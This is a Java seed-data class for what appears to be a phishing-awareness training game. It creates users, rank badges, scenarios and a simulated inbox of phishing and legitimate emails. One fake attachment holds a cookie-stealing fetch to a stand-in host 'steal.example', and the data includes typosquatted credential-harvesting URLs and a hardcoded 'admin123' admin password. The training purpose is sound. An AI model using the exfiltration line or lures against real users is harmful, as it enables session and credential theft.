package com.example.cybershield.config;

import com.example.cybershield.entity.Badge;
import com.example.cybershield.entity.LandingPage;
import com.example.cybershield.entity.Scenario;
import com.example.cybershield.entity.ScenarioStep;
import com.example.cybershield.entity.User;
import com.example.cybershield.entity.VirtualInboxEmail;
import com.example.cybershield.repository.BadgeRepository;
import com.example.cybershield.repository.LandingPageRepository;
import com.example.cybershield.repository.ScenarioRepository;
import com.example.cybershield.repository.ScenarioStepRepository;
import com.example.cybershield.repository.UserRepository;
import com.example.cybershield.repository.VirtualInboxEmailRepository;
import lombok.RequiredArgsConstructor;
import org.springframework.boot.CommandLineRunner;
import org.springframework.security.crypto.password.PasswordEncoder;
import org.springframework.stereotype.Component;

import java.util.ArrayList;
import java.util.List;

@Component
@RequiredArgsConstructor
public class DataInitializer implements CommandLineRunner {

    private final UserRepository userRepository;
    private final ScenarioRepository scenarioRepository;
    private final ScenarioStepRepository scenarioStepRepository;
    private final LandingPageRepository landingPageRepository;
    private final VirtualInboxEmailRepository virtualInboxEmailRepository;
    private final BadgeRepository badgeRepository;
    private final PasswordEncoder passwordEncoder;

    @Override
    public void run(String... args) {
        User admin = ensureAdminUser();
        User player = ensurePlayerUser();

        List<Scenario> scenarios = seedFlowScenarios();
        seedFlowSteps(scenarios);
        seedFlowInboxEmails();
        ensureBadges();

        System.out.println("Seed Data hoan tat. Admin: " + admin.getUsername() + ", Player: " + player.getUsername());
    }

    private User ensureAdminUser() {
        return userRepository.findByUsername("admin").orElseGet(() -> {
            User admin = new User();
            admin.setUsername("admin");
            admin.setPasswordHash(passwordEncoder.encode("admin123"));
            admin.setRole("ROLE_ADMIN");
            admin.setAvatarUrl("https://ui-avatars.com/api/?name=admin&background=0f172a&color=fff");
            admin.setLevel(100);
            admin.setTotalExp(75000);
            admin.setTrapClicks(0);
            admin.setCorrectReports(120);
            admin.setAvgResponseTime(0.65f);
            return userRepository.save(admin);
        });
    }

    private User ensurePlayerUser() {
        return userRepository.findByUsername("hoangit69").orElseGet(() -> {
            User player = new User();
            player.setUsername("hoangit69");
            player.setPasswordHash(passwordEncoder.encode("123456"));
            player.setRole("ROLE_USER");
            player.setAvatarUrl("https://ui-avatars.com/api/?name=hoangit&background=1e293b&color=fff");
            player.setLevel(8);
            player.setTotalExp(5200);
            player.setTrapClicks(3);
            player.setCorrectReports(16);
            player.setAvgResponseTime(1.18f);
            return userRepository.save(player);
        });
    }

    private void ensureBadges() {
        if (badgeRepository.count() > 0) return;

        List<Badge> badges = new ArrayList<>();
        badges.add(buildBadge(1, "Sat - Tan Binh", "https://res.cloudinary.com/drdim9z1v/image/upload/v1775207808/Rank1_S%E1%BA%AFt_l9tft7.png", 0));
        badges.add(buildBadge(2, "Dong - Tham Tu So", "https://res.cloudinary.com/drdim9z1v/image/upload/v1775207808/Rank2_%C4%90%E1%BB%93ng_obqlkf.png", 500));
        badges.add(buildBadge(3, "Bac - Chuyen Vien", "https://res.cloudinary.com/drdim9z1v/image/upload/v1775207808/Rank3_B%E1%BA%A1c_yiylke.png", 1500));
        badges.add(buildBadge(4, "Bach Kim - Tinh Anh", "https://res.cloudinary.com/drdim9z1v/image/upload/v1775207809/Rank5_B%E1%BA%A1chKim_m52r0q.png", 6000));
        badges.add(buildBadge(5, "Luc Bao - Chuyen Gia", "https://res.cloudinary.com/drdim9z1v/image/upload/v1775207808/Rank6_L%E1%BB%A5cB%E1%BA%A3o_sytkat.png", 10000));
        badges.add(buildBadge(6, "Kim Cuong - Huyen Thoai", "https://res.cloudinary.com/drdim9z1v/image/upload/v1775208171/Rank7_KimC%C6%B0%C6%A1ng_kuore7.png", 20000));
        badges.add(buildBadge(7, "Cao Thu - Buc Tuong Lua", "https://res.cloudinary.com/drdim9z1v/image/upload/v1775207809/Rank8_CaoTh%E1%BB%A7_bwchpp.png", 40000));
        badges.add(buildBadge(8, "Thach Dau - Cyber Overlord", "https://res.cloudinary.com/drdim9z1v/image/upload/v1775208176/Rank9_Th%C3%A1ch%C4%90%E1%BA%A5u_i2svwp.png", 75000));
        badgeRepository.saveAll(badges);
    }

    private Badge buildBadge(int id, String name, String iconUrl, int requiredExp) {
        Badge badge = new Badge();
        badge.setId(id);
        badge.setName(name);
        badge.setIconUrl(iconUrl);
        badge.setRequiredExp(requiredExp);
        return badge;
    }

    private List<Scenario> seedFlowScenarios() {
        if (scenarioRepository.count() > 0) return scenarioRepository.findAll();

        List<Scenario> scenarios = new ArrayList<>();
        scenarios.add(createScenario("Flow Test 1: MAIL", "MAIL_STANDARD", "Easy", "https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?auto=format&fit=crop&w=1200&q=80", "Luong kiem thu email text co ban.", 250));
        scenarios.add(createScenario("Flow Test 2: MAIL + FILE", "MAIL_FILE", "Easy", "https://images.unsplash.com/photo-1516321318423-f06f85e504b3?auto=format&fit=crop&w=1200&q=80", "Luong kiem thu email co file dinh kem dang ngo.", 300));
        scenarios.add(createScenario("Flow Test 3: MAIL + WEB", "MAIL_WEB", "Medium", "https://images.unsplash.com/photo-1454165804606-c3d57bc86b40?auto=format&fit=crop&w=1200&q=80", "Luong kiem thu click link mo browser gia.", 400));
        scenarios.add(createScenario("Flow Test 4: MAIL + OTP", "MAIL_OTP", "Medium", "https://images.unsplash.com/photo-1563013544-824ae1b704d3?auto=format&fit=crop&w=1200&q=80", "Luong kiem thu phishing OTP.", 450));
        scenarios.add(createScenario("Flow Test 5: MAIL + ZALO", "MAIL_ZALO", "Hard", "https://images.unsplash.com/photo-1518770660439-4636190af475?auto=format&fit=crop&w=1200&q=80", "Luong kiem thu social engineering da kenh.", 500));
        return scenarioRepository.saveAll(scenarios);
    }

    private Scenario createScenario(String title, String category, String difficulty, String thumbnail, String description, int rewardExp) {
        Scenario scenario = new Scenario();
        scenario.setTitle(title);
        scenario.setCategory(category);
        scenario.setDifficulty(difficulty);
        scenario.setThumbnailUrl(thumbnail);
        scenario.setDescription(description);
        scenario.setRewardExp(rewardExp);
        return scenario;
    }

    private void seedFlowSteps(List<Scenario> scenarios) {
        if (scenarios.size() < 5) return;

        upsertStep(scenarios.get(0), 1, "MAIL", "{\"scenarioType\":\"MAIL_STANDARD\",\"title\":\"MAIL co ban\",\"threatLevel\":1}", "CLICK_LINK", "REPORT", "Flow MAIL");
        upsertStep(scenarios.get(1), 1, "MAIL", "{\"scenarioType\":\"MAIL_FILE\",\"title\":\"MAIL + FILE\",\"threatLevel\":2}", "CLICK_LINK", "REPORT", "Flow MAIL+FILE");
        ScenarioStep webStep = upsertStep(scenarios.get(2), 1, "WEB_PAGE", "{\"scenarioType\":\"MAIL_WEB\",\"title\":\"MAIL + WEB\",\"traps\":{\"browser\":{\"enabled\":true,\"title\":\"Microsoft 365 Security Check\",\"displayUrl\":\"https://login.microsoftonline.com-security-check.com/verify\",\"actualUrl\":\"https://login.microsoftonline.com-security-check.com/verify\",\"formType\":\"CREDENTIAL\"}},\"threatLevel\":3}", "INPUT", "REPORT", "Flow MAIL+WEB");
        landingPageRepository.save(buildLanding(webStep, scenarios.get(2).getTitle()));
        upsertStep(scenarios.get(3), 1, "MAIL_OTP", "{\"scenarioType\":\"MAIL_OTP\",\"otpCode\":\"123456\",\"title\":\"MAIL + OTP\",\"message\":\"OTP hien thi trong email.\",\"threatLevel\":4}", "INPUT", "REPORT", "Flow MAIL+OTP");
        upsertStep(scenarios.get(4), 1, "ZALO", "{\"scenarioType\":\"MAIL_ZALO\",\"title\":\"MAIL + ZALO\",\"sender\":\"IT Helpdesk Clone\",\"messages\":[{\"sender\":\"IT Helpdesk Clone\",\"text\":\"Check mail va duyet gap giup anh.\"}],\"threatLevel\":5}", "INPUT", "REPORT", "Flow MAIL+ZALO");
    }

    private ScenarioStep upsertStep(Scenario scenario, int order, String type, String content, String triggerFailure, String triggerSuccess, String hint) {
        ScenarioStep step = scenarioStepRepository.findByScenarioIdOrderByStepOrderAsc(scenario.getId())
                .stream()
                .filter(existing -> existing.getStepOrder() == order)
                .findFirst()
                .orElseGet(ScenarioStep::new);
        step.setScenario(scenario);
        step.setStepOrder(order);
        step.setStepType(type);
        step.setContent(content);
        step.setTriggerFailure(triggerFailure);
        step.setTriggerSuccess(triggerSuccess);
        step.setAiFeedback(hint);
        return scenarioStepRepository.save(step);
    }

    private void seedFlowInboxEmails() {
        for (Scenario scenario : scenarioRepository.findAll()) {
            for (ScenarioStep step : scenarioStepRepository.findByScenarioIdOrderByStepOrderAsc(scenario.getId())) {
                List<VirtualInboxEmail> existingEmails = virtualInboxEmailRepository.findByScenarioStep_IdOrderBySortOrderAsc(step.getId());
                if (!existingEmails.isEmpty()) {
                    virtualInboxEmailRepository.deleteAll(existingEmails);
                }
                virtualInboxEmailRepository.saveAll(buildInboxForStep(step));
            }
        }
    }

    private List<VirtualInboxEmail> buildInboxForStep(ScenarioStep step) {
        String content = step.getContent() == null ? "" : step.getContent();
        List<VirtualInboxEmail> emails = new ArrayList<>();
        if (content.contains("\"scenarioType\":\"MAIL_FILE\"")) {
            emails.add(buildInboxEmail(
                    step,
                    1,
                    "PHISH",
                    true,
                    "it-helpdesk@secure-portal365.com",
                    "IT Helpdesk",
                    "Bat buoc cap nhat plugin bao mat ngay hom nay",
                    "He thong yeu cau cap nhat plugin moi. Vui long tai file dinh kem va chay truoc 17:00.",
                    "#",
                    "Tai tep",
                    "{\"fileName\":\"SecurityPatch_2026.js\",\"mimeLabel\":\"JavaScript\",\"viewerTitle\":\"Notepad\",\"content\":\"fetch('http://steal.example/log?c='+document.cookie)\",\"fileWarnings\":[\"File script tu domain la\",\"Yeu cau chay file truc tiep\"]}",
                    List.of("Nguoi gui la domain ngoai", "Yeu cau chay file .js khan cap")
            ));
            emails.add(buildInboxEmail(
                    step,
                    2,
                    "LEGIT",
                    false,
                    "hr@cybershield.internal",
                    "HR Department",
                    "Thong bao lich dao tao quy 2",
                    "Thong bao lich dao tao noi bo. Khong can tai them tep nao.",
                    "https://intranet.cybershield.internal/training",
                    "Mo intranet",
                    null,
                    List.of()
            ));
            return emails;
        }

        if (content.contains("\"scenarioType\":\"MAIL_WEB\"")) {
            emails.add(buildInboxEmail(
                    step,
                    1,
                    "PHISH",
                    true,
                    "security-alert@micr0soft-support365.com",
                    "Microsoft 365 Security",
                    "[Khẩn] Tài khoản công ty sắp bị tạm khóa",
                    "Hệ thống ghi nhận đăng nhập bất thường vào Microsoft 365. Vui lòng xác minh lại tài khoản trong vòng 15 phút để tránh gián đoạn email/Teams.",
                    "https://login.microsoftonline.com-security-check.com/verify",
                    "Xác minh tài khoản",
                    null,
                    List.of(
                            "Domain người gửi không phải microsoft.com",
                            "Link đăng nhập có domain gần giống (typosquatting)",
                            "Tạo áp lực thời gian 15 phút để ép nhập mật khẩu"
                    )
            ));
            emails.add(buildInboxEmail(
                    step,
                    2,
                    "LEGIT",
                    false,
                    "it-notify@cybershield.internal",
                    "IT Operations",
                    "Nhắc nhở bảo mật: không nhập mật khẩu vào trang lạ",
                    "Đội IT nội bộ nhắc lại: chỉ đăng nhập tại cổng chính thức login.microsoftonline.com và luôn kiểm tra kỹ domain trước khi nhập mật khẩu.",
                    "https://learn.microsoft.com/en-us/security/",
                    "Xem hướng dẫn bảo mật",
                    null,
                    List.of()
            ));
            return emails;
        }

        emails.add(buildInboxEmail(
                step,
                1,
                "PHISH",
                true,
                "admin@free-gifts.xyz",
                "Khuyen mai",
                "Canh bao / Khuyen mai",
                "Noi dung email test phishing",
                "http://free-gifts.xyz/claim",
                "Mo link",
                null,
                List.of("Domain la")
        ));
        emails.add(buildInboxEmail(
                step,
                2,
                "LEGIT",
                false,
                "hr@cybershield.internal",
                "HR",
                "Thong bao noi bo",
                "Noi dung email noi bo",
                "https://intranet.cybershield.internal",
                "Mo intranet",
                null,
                List.of()
        ));
        return emails;
    }

    private VirtualInboxEmail buildInboxEmail(ScenarioStep step, int queueOrder, String mailType, boolean phishing, String fromEmail, String fromName, String subject, String body, String linkUrl, String ctaLabel, String attachmentJson, List<String> redFlags) {
        VirtualInboxEmail email = new VirtualInboxEmail();
        email.setScenarioStep(step);
        email.setSortOrder(queueOrder);
        email.setSlotTag(mailType);
        email.setPhishing(phishing);
        email.setSenderEmail(fromEmail);
        email.setSenderName(fromName);
        email.setSubject(subject);
        email.setBody(body);
        email.setLinkUrl(linkUrl);
        email.setLinkLabel(ctaLabel);
        email.setAttachmentJson(attachmentJson);
        email.setRedFlags(redFlags == null ? List.of() : redFlags);
        return email;
    }

    private LandingPage buildLanding(ScenarioStep step, String scenarioTitle) {
        LandingPage landing = new LandingPage();
        landing.setStep(step);
        landing.setTemplateName("FlowTestTemplate-" + step.getStepOrder());
        landing.setFakeUrl("https://secure-" + scenarioTitle.toLowerCase().replace(" ", "-") + ".verify-login.net");
        landing.setRequiredFields("[\"username\",\"password\",\"otp\"]");
        return landing;
    }
}
